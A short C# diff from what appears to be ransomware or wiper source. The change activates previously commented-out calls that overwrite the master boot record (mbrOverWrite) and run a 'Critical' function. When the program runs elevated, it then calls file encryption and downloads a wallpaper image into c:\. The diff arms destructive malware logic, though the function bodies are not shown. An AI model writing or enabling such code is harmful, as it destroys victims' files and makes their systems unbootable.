@@ -277,8 +277,8 @@ namespace Program
         {
             if (IsElevated == true)
             {
-                // mbrOverWrite(); - Calls the function to overwrite the master boot record
-                // Critical(); - Calls the critical function
+                mbrOverWrite();
+                Critical();
                 EncryptFile(); // Calls the file encryption function
                 new WebClient().DownloadFile("https://i.imgur.com/wAvU1Km.jpg", @"c:\wAvU1Km.jpg"); // Downloads the picture we want as wallpaper and places it in the c:\ directory
                 Thread.Sleep(2000);
